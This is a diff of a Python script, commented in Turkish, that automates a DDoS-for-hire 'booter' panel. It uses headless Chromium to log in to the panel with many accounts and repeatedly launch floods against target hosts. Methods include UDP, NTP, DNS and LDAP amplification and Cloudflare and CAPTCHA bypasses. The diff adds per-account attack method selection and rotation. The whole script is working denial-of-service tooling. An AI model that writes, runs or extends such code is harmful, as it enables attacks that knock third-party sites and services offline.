@@ -17,21 +17,22 @@ BASE_URL = "https://hardstress.st"
 LOGIN_URL = f"{BASE_URL}/panel/login.php"
 BOOTER_URL = f"{BASE_URL}/panel/booter.php"
 
-METHODS = [
+PORT = 80
+DURATION = 60
+
+# Aynı anda kaç thread çalışsın (Railway ücretsizde 2 ideal)
+MAX_CONCURRENT_THREADS = 2
+
+# Varsayılan method listesi (eğer method belirtilmemişse sırayla)
+DEFAULT_METHODS = [
     "UDP", "LDAP", "ARD", "VOX", "STUN", "VSE", "ACK", "IPX", "KGB",
     "PROWIN", "DNS", "NTP", "TCP", "WIZARD", "XSYN", "ZAP", "ZSYN",
     "CLOUDFLARE", "RAW", "HEAVYJES", "REQUESTS", "HTTP", "HTTPS",
     "CAPTCHA-BYPASS", "CFBYPASSV2", "SOCKET", "TLS", "CLOUDFLARE-UAM"
 ]
 
-PORT = 80
-DURATION = 60  # saniye
-
-# Aynı anda kaç thread çalışsın (Railway ücretsizde 2 ideal)
-MAX_CONCURRENT_THREADS = 2
-
 # ------------------------------
-# TARAYICI KURULUMU (Railway uyumlu + kararlı)
+# TARAYICI KURULUMU (Railway uyumlu)
 # ------------------------------
 def create_driver():
     chrome_options = Options()
@@ -41,7 +42,7 @@ def create_driver():
     chrome_options.add_argument("--disable-gpu")
     chrome_options.add_argument("--disable-software-rasterizer")
     chrome_options.add_argument("--disable-setuid-sandbox")
-    chrome_options.add_argument("--single-process")  # bellek tasarrufu
+    chrome_options.add_argument("--single-process")
     chrome_options.add_argument("--memory-pressure-off")
     chrome_options.add_argument("--window-size=1920,1080")
     chrome_options.add_argument("--remote-debugging-port=9222")
@@ -50,7 +51,6 @@ def create_driver():
     chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
     chrome_options.add_experimental_option('useAutomationExtension', False)
 
-    # Railway'de Chromium yolu
     chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
     chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")
 
@@ -61,7 +61,6 @@ def create_driver():
         service = Service(executable_path=chromedriver_path)
         driver = webdriver.Chrome(service=service, options=chrome_options)
     else:
-        # Yedek: webdriver-manager (yerel test için)
         from webdriver_manager.chrome import ChromeDriverManager
         service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=chrome_options)
@@ -85,7 +84,7 @@ def click_okay_modal(driver):
         pass
 
 # ------------------------------
-# HER HESAP İÇİN ANA SALDIRI DÖNGÜSÜ (KENDİNİ ONARIR)
+# HER HESAP İÇİN ANA SALDIRI DÖNGÜSÜ
 # ------------------------------
 def attack_loop(username, password, target_host, method):
     while True:
@@ -181,7 +180,7 @@ def attack_loop(username, password, target_host, method):
             continue
 
 # ------------------------------
-# HESAPLARI OKU VE THREAD'LARI BAŞLAT (SINIRLI SAYIDA)
+# HESAPLARI OKU (user:pass:link:method)
 # ------------------------------
 def main():
     lines = []
@@ -202,8 +201,12 @@ def main():
     for line in lines:
         parts = line.split(":")
         if len(parts) >= 3:
-            user, passw, link = parts[0], parts[1], parts[2]
-            accounts.append((user, passw, link))
+            user = parts[0]
+            passw = parts[1]
+            link = parts[2]
+            # 4. alan varsa method, yoksa None
+            method = parts[3] if len(parts) >= 4 else None
+            accounts.append((user, passw, link, method))
         else:
             print(f"[!] Geçersiz satır atlanıyor: {line}")
 
@@ -211,7 +214,15 @@ def main():
         print("[!] Geçerli hesap bulunamadı.")
         return
 
-    # Thread havuzu – sadece MAX_CONCURRENT_THREADS kadar aktif thread
+    # Method ataması: eğer method belirtilmemişse sırayla ata
+    default_index = 0
+    for i, (user, passw, link, method) in enumerate(accounts):
+        if method is None:
+            method = DEFAULT_METHODS[default_index % len(DEFAULT_METHODS)]
+            default_index += 1
+            accounts[i] = (user, passw, link, method)
+
+    # Thread havuzu
     semaphore = threading.Semaphore(MAX_CONCURRENT_THREADS)
 
     def thread_wrapper(user, passw, link, method):
@@ -219,13 +230,12 @@ def main():
             attack_loop(user, passw, link, method)
 
     threads = []
-    for idx, (user, passw, link) in enumerate(accounts):
-        method = METHODS[idx % len(METHODS)]
+    for user, passw, link, method in accounts:
         print(f"Thread başlatılıyor: {user} -> Hedef: {link}, Method: {method}")
         t = threading.Thread(target=thread_wrapper, args=(user, passw, link, method), daemon=True)
         t.start()
         threads.append(t)
-        time.sleep(10)  # Her thread arasında 10 saniye bekle (kaynak kullanımını azaltır)
+        time.sleep(10)  # kaynak kullanımını azaltmak için
 
     for t in threads:
         t.join()
